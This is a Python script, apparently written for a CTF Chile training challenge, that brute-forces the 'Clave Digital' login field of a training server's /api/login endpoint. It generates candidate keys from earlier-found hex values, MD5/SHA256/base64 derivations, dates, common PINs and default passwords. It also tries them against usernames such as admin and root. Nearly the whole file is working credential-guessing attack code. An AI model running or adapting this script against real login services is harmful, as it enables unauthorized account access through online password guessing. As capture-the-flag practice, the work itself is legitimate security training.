#!/usr/bin/env python3
"""
CTF Chile - BÚSQUEDA DE LA CLAVE DIGITAL
El endpoint /api/login requiere "Clave Digital" - esta es la llave mal guardada
"""
import requests
import hashlib
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"

print("🗝️ BÚSQUEDA DE LA CLAVE DIGITAL")
print("=" * 50)

def test_digital_key(key, username="vault"):
    """Prueba una clave digital en /api/login"""
    try:
        r = requests.post(TARGET + "/api/login",
                         headers={"Content-Type": "application/json"},
                         json={"username": username, "claveDigital": key},
                         timeout=10)

        response = r.text
        print(f"   Clave '{key}': {r.status_code} - {response[:100]}...")

        if "incorrecta" not in response and r.status_code != 401:
            print(f"   🎯 POSIBLE ÉXITO: {response}")
            return True

    except Exception as e:
        print(f"   Error: {e}")

    return False

print("[1/4] Probando claves derivadas de valores hex...")

# Los valores hex que encontramos antes
hex_values = ["0x11000040", "0x10000000", "0x10000040", "0x1003", "0x80", "0x9"]

# Convertir a diferentes formatos para clave digital
candidates = []

for hex_val in hex_values:
    decimal = int(hex_val, 16)

    # Formatos posibles de clave digital
    candidates.extend([
        hex_val,                    # Formato hex
        str(decimal),              # Decimal
        hex_val.replace("0x", ""),  # Hex sin prefijo
        f"{decimal:08d}",          # Decimal con padding
        f"{decimal:x}",            # Hex lowercase
        f"{decimal:X}",            # Hex uppercase
    ])

# Combinaciones de valores
candidates.extend([
    "11000040",
    "10000000",
    "10000040",
    "110000401000000010000040",  # Concatenación
    "admin123",                   # Password que funcionó antes
    "vault123",                   # Variación
    "omnivault123",              # Relacionado con el sistema
])

print(f"   Probando {len(candidates)} claves candidatas...")

for key in candidates[:20]:  # Primeras 20 para no saturar
    if test_digital_key(key):
        print(f"🏆 CLAVE DIGITAL ENCONTRADA: {key}")
        break

print("\n[2/4] Probando claves hash derivadas...")

# Hashes de datos conocidos
base_strings = [
    "vault:admin123",
    "omnivault",
    "infiltracion",
    "vault",
    "admin123",
    "17.0.0.64",
    "16.0.0.64",
]

for base_string in base_strings:
    # MD5
    md5_hash = hashlib.md5(base_string.encode()).hexdigest()
    candidates.append(md5_hash)
    candidates.append(md5_hash[:8])  # Primeros 8 chars

    # SHA256
    sha256_hash = hashlib.sha256(base_string.encode()).hexdigest()
    candidates.append(sha256_hash[:16])  # Primeros 16 chars

    # Base64
    b64_encoded = base64.b64encode(base_string.encode()).decode()
    candidates.append(b64_encoded)

print(f"   Probando {len(base_strings * 4)} claves hash...")

for i, key in enumerate(candidates[20:40]):  # Siguiente batch
    if test_digital_key(key):
        print(f"🏆 CLAVE DIGITAL ENCONTRADA: {key}")
        break

print("\n[3/4] Probando formatos específicos de clave digital...")

# Formatos típicos de claves digitales
digital_formats = [
    "1234567890",
    "0123456789",
    "2024051400",  # Fecha formato
    "20240514",    # Fecha corta
    "051424",      # Fecha muy corta
    "123456",      # PIN típico
    "admin",       # Simple
    "vault",       # Usuario
    "omnivault",   # Sistema
    "infiltracion", # Tema del CTF
]

print(f"   Probando {len(digital_formats)} formatos digitales...")

for key in digital_formats:
    if test_digital_key(key):
        print(f"🏆 CLAVE DIGITAL ENCONTRADA: {key}")
        break

print("\n[4/4] Probando con otros usuarios...")

# Probar con usuarios diferentes
users = ["admin", "root", "ctf", "omnivault", "system"]

for user in users:
    print(f"   Probando usuario {user}...")
    for key in ["admin123", "123456", "password", user]:
        try:
            r = requests.post(TARGET + "/api/login",
                             headers={"Content-Type": "application/json"},
                             json={"username": user, "claveDigital": key},
                             timeout=5)

            if "incorrecta" not in r.text and r.status_code != 401:
                print(f"🏆 ÉXITO: Usuario {user} + Clave {key}")
                print(f"    Respuesta: {r.text}")
                break

        except:
            pass

print("\n" + "="*60)
print("🗝️ BÚSQUEDA DE CLAVE DIGITAL COMPLETADA")
print("="*60)
print("💡 Si no se encontró la clave, revisar:")
print("   • Webhooks anteriores para más pistas")
print("   • Archivos de configuración del sistema")
print("   • Otros formatos de los valores hex")
print("="*60)